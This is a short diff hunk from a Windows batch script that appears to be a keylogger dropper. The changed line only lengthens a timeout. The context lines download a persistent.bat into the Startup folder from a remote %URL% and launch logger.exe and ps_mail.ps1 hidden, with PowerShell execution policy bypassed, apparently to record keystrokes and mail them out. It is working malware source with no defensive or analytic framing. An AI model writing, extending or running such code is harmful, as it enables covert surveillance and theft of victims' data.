@@ -16,7 +16,7 @@ start /min "" powershell -Command (curl %URL%/persistent.bat -o "$env:USERPROFIL
 @REM start powershell -Command "Invoke-Webrequest -Uri %URL%/Record.txt -OutFile $env:TEMP\Record.txt"
 @REM start powershell -Command "Invoke-Webrequest -Uri %URL%/persistent.bat -OutFile '%fileStartup%\persistent.bat'"
 
-timeout /t 2 /nobreak /min ""
+timeout /t 5 /nobreak /min ""
 
 start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\logger.exe"
 start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& $env:TEMP\ps_mail.ps1"
